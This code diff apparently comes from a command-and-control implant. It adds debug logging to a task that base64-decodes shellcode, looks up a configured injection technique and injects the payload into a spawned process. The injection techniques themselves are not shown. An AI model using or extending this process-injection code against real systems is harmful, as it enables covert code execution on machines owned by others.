@@ -25,10 +25,12 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
             string message = string.Empty;
             if (args is null || !args.Validate(out message))
             {
+                DebugLog.Log($"{Name} invalid args: {message} [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
@@ -41,6 +43,7 @@ namespace Workflow
 
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
+            DebugLog.Log($"{Name} shellcode size={buf.Length} [{job.task.id}]");
 
             SpawnOptions so = args.GetSpawnOptions(job.task.id);
             try
@@ -48,20 +51,25 @@ namespace Workflow
                 var technique = techniques.Where(x => x.id == this.config.inject).First();
                 if (technique is null)
                 {
+                    DebugLog.Log($"{Name} technique not found [{job.task.id}]");
                     await WriteDebug("Failed to find technique", job.task.id);
                     return;
                 }
 
+                DebugLog.Log($"{Name} injecting with technique {this.config.inject} [{job.task.id}]");
                 if(!await technique.Inject(spawner, so, buf))
                 {
+                    DebugLog.Log($"{Name} injection failed [{job.task.id}]");
                     messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                     return;
                 }
             }
             catch (Exception e)
             {
+                DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                 await WriteDebug(e.ToString(), job.task.id);
             }
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
             return;
         }
 
